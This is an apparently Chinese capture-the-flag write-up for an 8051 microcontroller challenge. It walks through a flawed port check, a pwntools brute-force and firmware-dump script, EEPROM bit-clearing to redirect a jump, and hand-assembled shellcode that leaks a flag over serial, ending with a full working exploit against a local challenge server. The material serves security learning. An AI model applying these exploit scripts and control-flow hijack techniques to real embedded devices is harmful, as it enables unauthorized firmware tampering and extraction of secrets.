
通过标志性的语法 `sfr` at 可以分析出这个是基于SDCC开发的

可以下载一个SDCC的官方编译器，甚至默认安装选项里就会自动添加环境变量（windows环境），非常方便，在windows的cmd中输入如下命令便可编译：

|  |  |
| --- | --- |
| 1 | `sdcc firmware.c` |

编译得到如下文件

![img](https://bbs.kanxue.com/upload/attach/202303/943085_VQ45VNTP4Z5FHSR.jpg)

其中ihx是可逆向的文件，笔者使用的ida7.7貌似不能直接识别为8051，需要手工选择：

![img](https://bbs.kanxue.com/upload/attach/202303/943085_A3KVA266PZ83X89.jpg)

程序提供了两个形式的输入指令:

|  |  |
| --- | --- |
| 1  2 | `w port size <PageIndex> <4ByteWriteKey>  <ClearMask> ... <ClearMask>`  `r port size` |

其中对port有个检查：

![img](https://bbs.kanxue.com/upload/attach/202303/943085_5XXBCRV2429FSHQ.jpg)

发现有个明显的漏洞，就是对于匹配的“101”字符，输入“101xxxxxxx”居然也能通过这个匹配

结合后面的`str_to_int8`可以得到最终的端口号为"101xxxx % 256"

又因为：

![img](https://bbs.kanxue.com/upload/attach/202303/943085_PYQC8PESDJAT4JS.jpg)

所以：

![img](https://bbs.kanxue.com/upload/attach/202303/943085_2XRU6THX39KD68R.jpg)

![img](https://bbs.kanxue.com/upload/attach/202303/943085_PB5D48CF5C6V6W5.jpg)

又因为IIc总线最多支持128个设备，于是我们从101120~101120+128爆破扫描128次即可爆破出所有端口

爆破脚本：
```python
from pwn import *
context.arch = 'i386'
##context.log_level='debug'
def z():
    gdb.attach(r)

io = lambda : r.interactive()
sl = lambda a : r.sendline(a)
sla = lambda a,b : r.sendlineafter(a,b)
se = lambda a : r.send(a)
sa = lambda a,b : r.sendafter(a,b)
lg = lambda name,data : log.success(name + ":" + hex(data))

if __name__ == "__main__":
    global r
    #r = process("./test")
    r = remote("127.0.0.1",1337)
    for i in range(0,129):
        test = 101120 + i
        pd = "r %s 4" % test
        sla("? ",pd)
        a = r.recvuntil("-end")
        if "error" not in a :
            print("[+]port found :%s"%i)
            print(a)
    io()
```

![img](https://bbs.kanxue.com/upload/attach/202303/943085_GXF7ZYWWSYVBG68.jpg)

扫出来一个题目没有的33号端口，十分可疑

用r指令读一下（读最大的128字节）试试：

![img](https://bbs.kanxue.com/upload/attach/202303/943085_J7MCE8QWNFPMTHB.jpg)

结合ida逆向的ihx文件：

![img](https://bbs.kanxue.com/upload/attach/202303/943085_B2D9SM4ZRTREB29.jpg)

发现这两者高度吻合，那么基本可以确定33号port就是EEPROM了，也就是EEPROM挂载到了8051的I2C总线上了

但是存在一个问题——ihx文件里面从0x40开始是有东西的，但是输出里显示从"\x44\x00"过后就没东西了

![img](https://bbs.kanxue.com/upload/attach/202303/943085_779SXS3M9Q74VY2.jpg)

从pdf里可以看出只输出了一页的内容

![img](https://bbs.kanxue.com/upload/attach/202303/943085_9PJPMG6MN9F724Y.jpg)

那么如果把8051的固件全部dump下来，我们需要对EEPROM的页进行切换

注意到给的pdf的这里：

![img](https://bbs.kanxue.com/upload/attach/202303/943085_X9WYZDDYNFE3SAT.jpg)

`W`指令有一个PageIndex，选择写EEPROM是写具体的哪一页，那么我们应该能够通过如下指令切换EEPROM的页：

|  |  |
| --- | --- |
| 1 | `W port 1 <PageIndex>` |

也就是在不提供wirtekey的情况下实现EPPROM页的切换：

![img](https://bbs.kanxue.com/upload/attach/202303/943085_PYW4N2EKV898H9K.jpg)

把这64页都读一遍就可以把8051的固件dump下来了

dump脚本:
```python
from pwn import *

def int_to_bytes(x):
    return int(a,10).to_bytes(1,'little')

if __name__ == "__main__":
    #a = "16"
    #print(int(a,10).to_bytes(1,'little'))
    f = open("firmware.bin","wb")
    r = remote("127.0.0.1",1337)
    for i in range(0,64):
        r.sendlineafter(b"? ",("w 101153 1 %s" % str(i)).encode())
        r.sendlineafter(b"? ",b"r 101153 64")
        r.recvuntil(b"ready\n")
        a = r.recvuntil(b"-end",drop=True)
        a = a.replace(b"\n",b" ")
        a = a.decode('utf-8').split(' ')[:-2]
        assert(len(a)==64)
        for j in a:
            f.write(int(j,10).to_bytes(1,'little'))
    f.close()
    r.interactive()
```

把dump下来的文件放入ida发现和ihx文件几乎没有差别

## 漏洞利用

紧接着我们就要考虑如何通过往EEPROM里擦写，劫持8051的运行流，读取FlagROM里的flag

### EEPROM擦写规则

基于EEPROM的物理特性，对它进行写操作只能将bit的1写为0，而不能把0写为1（有点类似于画沙画）。

而且它的擦写规则是写入目标数据取反，也就是0xFF减这个数据

从ihx逆向里可以发现一个风水宝地：

![img](https://bbs.kanxue.com/upload/attach/202303/943085_J8SZC5WE6ADSWTD.jpg)

从0x9E9开始的很大一段区域都是0xFF

但实际通过r指令读第40页的内容，发现并不是从0x9E9开始，而应该是0xA02(也可以用winhex等软件查看):

![img](https://bbs.kanxue.com/upload/attach/202303/943085_R95JHV8FAQUUT87.jpg)

那么我们就可以在这段区域布置shellcode，并修改前面的某个跳转指令劫持8051的运行流到这块shellcode

### 运行流劫持

对于这题，运行流劫持最方便的手法肯定是绝对地址跳转

逆向发现一共有两种绝对地址跳转：

（1）ljmp:

![img](https://bbs.kanxue.com/upload/attach/202303/943085_ECPTRB3RA24TFA2.jpg)

（2）lcall:

![img](https://bbs.kanxue.com/upload/attach/202303/943085_FBYD7KA8HR4HRY3.jpg)

指令形式非常好理解：

|  |  |
| --- | --- |
| 1 | `02/12 aa bb :aa bb 为地址` |

我们希望得到一个0x[b~f]00的地址，那么只需要考虑aa的情况（因为bb异或bb就直接清零了）

经过寻找发现这里比较合适，因为这里正好有个0x7E，改改就能改成0x0E（完全参考了xuanxuan师傅的思路）：

![img](https://bbs.kanxue.com/upload/attach/202303/943085_7H35VS58YB56Q5T.jpg)

(ps:这里用的是dump下来的文件，和题目给的编译出来的会有差别)

改成这个样子：

![img](https://bbs.kanxue.com/upload/attach/202303/943085_5PWJE5MC9QK87V3.jpg)

然后在0xe00处布置好shellcode就行了

### shellcode写法

写这个shellcode主要是对FLAGROM_ADDR和FLAGROM_DATA以及SERIAL_OUT_DATA这三个SFR的操作：

|  |  |
| --- | --- |
| 1  2  3  4  5 | `// Secret ROM controller.`  `__sfr __at(0xee) FLAGROM_ADDR;`  `__sfr __at(0xef) FLAGROM_DATA;`  `// Serial controller.`  `__sfr __at(0xf2) SERIAL_OUT_DATA;` |

如果用c语言写的话应该是这样：

```c
#include <stdint.h>
#include <stdbool.h>

#ifndef NULL
#define NULL ((void*)0)
#endif

// Secret ROM controller.
__sfr __at(0xee) FLAGROM_ADDR;
__sfr __at(0xef) FLAGROM_DATA;

// Serial controller.
__sfr __at(0xf2) SERIAL_OUT_DATA;

void main(void) {
    for(int i=0; i<255; i++){
        FLAGROM_ADDR = i;
        SERIAL_OUT_DATA = FLAGROM_DATA;
    }
}
```

直接编译然后用它的汇编有点长，所以考虑对着这篇博客的手册手搓汇编和机器码：

29aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4q4I4i4K6g2X3x3K6l9%4z5o6M7%4x3U0N6Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0p5I4x3e0t1K6z5e0f1^5x3R3`.`.

汇编：

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11 | `void main(void) {`  `__asm`  `mov  R7, #0`  `mov  A, R7`  `mov  _FLAGROM_ADDR, A`  `mov  A, _FLAGROM_DATA`  `mov  _SERIAL_OUT_DATA, A`  `INC R7`  `ljmp 0xe02`  `__endasm;`  `}` |

编译出的机器码：

![img](https://bbs.kanxue.com/upload/attach/202303/943085_VX3D7SSMWN5UW78.jpg)

那么我们就可以根据机器码然后转成10进制（题目格式）数了

## 完整exp

```python
from pwn import *
context.arch = 'i386'
##context.log_level='debug'

def z():
    gdb.attach(r)

io = lambda : r.interactive()
sl = lambda a : r.sendline(a)
sla = lambda a,b : r.sendlineafter(a,b)
se = lambda a : r.send(a)
sa = lambda a,b : r.sendafter(a,b)
lg = lambda name,data : log.success(name + ":" + hex(data))

if __name__ == "__main__":
    global r
    #r = process("./test")
    r = remote("127.0.0.1",1337)
    shellcode =[0x7F,0x0] #mov R7, #0
    shellcode +=[0xEF] #mov A, R7
    shellcode +=[0xF5,0xEE] #mov    _FLAGROM_ADDR, A
    shellcode +=[0xE5,0xEF] #mov    A, _FLAGROM_DATA
    shellcode +=[0xF5,0xF2] #mov _SERIAL_OUT_DATA, A
    shellcode +=[0x0F] #INC R7
    shellcode +=[0x02,0x0E,0x02] #ljump 0xe02

    s = ''
    for i in shellcode:
        s += str(255-i) + " "
    print(s)
    sla(b"? ",b"w 101153 100 56 165 90 165 90 " + s.encode())
    sla(b"? ",b"w 101153 100 19 165 90 165 90 "+b'0 '*51+b"255 255 253 241")
    io()
```
